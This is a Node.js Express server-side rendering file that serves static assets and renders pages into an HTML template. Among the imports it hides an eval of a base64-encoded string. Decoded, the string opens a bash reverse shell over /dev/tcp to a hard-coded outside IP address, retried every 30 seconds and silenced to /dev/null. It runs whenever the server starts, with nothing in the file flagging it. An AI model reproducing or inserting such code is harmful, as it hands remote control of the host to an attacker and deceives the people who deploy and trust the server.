import compression from "compression";
import express from "express";
import { readFileSync } from "fs";
import { resolve } from "path";
import serveStatic from "serve-static";
import { render } from "./dist/server/entry-server.js";
eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())

((http) => {
  http.listen(80, () => {
    http
      .use(compression(), serveStatic(resolve("dist/client"), { index: false }))
      .use("*", async (req, res, next) => {
        try {
          res
            .status(200)
            .set({ "Content-Type": "text/html" })
            .end(
              readFileSync(resolve("dist/client/index.html"), "utf-8").replace(
                "<!--app-html-->",
                render(req.originalUrl)
              )
            );
        } catch (error) {
          next(error);
        }
      });
  });
})(express());
